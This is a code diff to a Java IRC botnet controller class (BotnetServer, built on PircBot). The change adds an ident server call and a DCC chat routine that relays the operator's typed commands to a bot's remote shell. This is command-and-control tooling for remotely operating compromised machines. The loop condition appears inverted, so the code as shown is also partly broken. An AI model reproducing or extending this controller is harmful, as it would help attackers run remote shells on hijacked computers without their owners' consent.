@@ -24,6 +24,8 @@ public class BotnetServer extends PircBot {
 			setVerbose(DEBUG);
 			setName(NAME);
 			setMessageDelay(0);
+			
+			startIdentServer();
 			connect(SERVER, PORT);
 			
 			setMode(CHANNEL, "s");
@@ -100,17 +102,24 @@ public class BotnetServer extends PircBot {
 	
 	private void engageInChat(String botNick, int timeout) {
 		chat = dccSendChatRequest(botNick, timeout);
-		try {
-			chat.readLine();
-			String response = input.nextLine();
-			while (response.equalsIgnoreCase("quit shell")) {
+		if (chat != null) {
+			System.out.println("Chat successful");
+			try {
+				chat.readLine();
+				String response = input.nextLine();
+				while (response.equalsIgnoreCase("quit shell")) {
+					chat.sendLine(response);
+					System.out.println(chat.readLine());
+					response = input.nextLine();
+				}
 				chat.sendLine(response);
-				System.out.println(chat.readLine());
-				response = input.nextLine();
+			} catch (Exception e) {
+				e.printStackTrace();
 			}
-			chat.sendLine(response);
-		} catch (Exception e) {
-			e.printStackTrace();
 		}
+	}
+	
+	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
+		//Perhaps this will enable chatting?
 	}
 }
